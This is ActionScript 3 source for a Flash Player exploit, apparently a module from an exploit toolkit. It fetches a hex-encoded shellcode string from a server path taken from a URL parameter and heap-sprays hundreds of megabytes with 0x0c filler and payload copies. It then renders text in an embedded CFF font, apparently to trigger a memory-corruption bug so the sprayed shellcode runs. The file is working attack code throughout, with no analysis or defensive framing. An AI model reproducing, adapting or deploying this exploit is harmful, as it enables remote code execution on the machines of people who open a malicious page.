package {
	import flash.text.engine.*;
	import flash.utils.*;
	import flash.display.*;
	import flash.events.*;
	import flash.net.*;
	import flash.external.*;
	
	public class Main extends Sprite {

		private var FontClass:Class;
		public var kbArray:ByteArray;
		public var mbArray:ByteArray;
		public var tmpArray:ByteArray;
		public var allocs:Array;
		private var shellcode:String;
		private var urlLoader:URLLoader = new URLLoader();
		
		public function Main():void{
			this.FontClass = Main_FontClass;
			super();
			var source:String = root.loaderInfo.parameters.s;
			var path:String = "/" + source + ".txt"
			var urlRequest:URLRequest = new URLRequest(path);
			urlLoader.dataFormat = URLLoaderDataFormat.TEXT;
			urlLoader.addEventListener(Event.COMPLETE, urlLoader_complete);
			urlLoader.load(urlRequest);
		}

		public function finishExploit(p:String):void{
			this.heapSpray(p);
			this.TextBlock_createTextLineExample();
		}

		public function urlLoader_complete(evt:Event):void {
			finishExploit(urlLoader.data);
		}

		public function TextBlock_createTextLineExample():void{
			var _local1 = "Edit the world in hex.";
			var _local2:FontDescription = new FontDescription("PSpop");
			_local2.fontLookup = FontLookup.EMBEDDED_CFF;
			var _local3:ElementFormat = new ElementFormat(_local2);
			_local3.fontSize = 16;
			var _local4:TextElement = new TextElement(_local1, _local3);
			var _local5:TextBlock = new TextBlock();
			_local5.content = _local4;
			this.createLines(_local5);
		}

		private function createLines(_arg1:TextBlock):void{
			var _local2:Number = 300;
			var _local3:Number = 15;
			var _local4:Number = 20;
			var _local5:TextLine = _arg1.createTextLine(null, _local2);
			while (_local5) {
				_local5.x = _local3;
				_local5.y = _local4;
				_local4 = (_local4 + (_local5.height + 2));
				addChild(_local5);
				_local5 = _arg1.createTextLine(_local5, _local2);
			};
		}

		public function heapSpray(p:String):void{
			var _local1:uint;
			_local1 = 0;
			this.kbArray = new ByteArray();
			this.kbArray.endian = Endian.LITTLE_ENDIAN;
			var _local4:String = p;
			var _local5:ByteArray = this.hexToBin(_local4);
			var _local6:uint = (_local4.length / 2);

			_local1 = 0;
			while (_local1 < 0x0400) {
				this.kbArray.writeByte(12);
				_local1 = (_local1 + 1);
			};

			_local1 = 0;
			this.mbArray = new ByteArray();
			this.mbArray.endian = Endian.LITTLE_ENDIAN;
			while (_local1 < 0x0400) {
				this.mbArray.writeBytes(this.kbArray, 0, this.kbArray.length);
				_local1 = (_local1 + 1);
			};
			_local1 = 0;
			while (_local1 < 0x100000) {
				this.mbArray.position = _local1;
				this.mbArray.writeBytes(_local5, 0, _local5.length);
				_local1 = (_local1 + 65536);
			};
			_local1 = 0;
			this.allocs = new Array();
			while (_local1 < 0x0200) {
				this.tmpArray = new ByteArray();
				this.tmpArray.endian = Endian.LITTLE_ENDIAN;
				this.tmpArray.writeBytes(this.mbArray, 0, this.mbArray.length);
				this.allocs.push(this.tmpArray);
				_local1 = (_local1 + 1);
			};
		}

		private function hexToBin(_arg1:String):ByteArray{
			var _local5:String;
			var _local2:ByteArray = new ByteArray();
			var _local3:uint = _arg1.length;
			var _local4:uint;
			_local2.endian = Endian.LITTLE_ENDIAN;
			while (_local4 < _local3) {
				_local5 = (_arg1.charAt(_local4) + _arg1.charAt((_local4 + 1)));
				_local2.writeByte(parseInt(_local5, 16));
				_local4 = (_local4 + 2);
			};
			return (_local2);
		}

	}
}
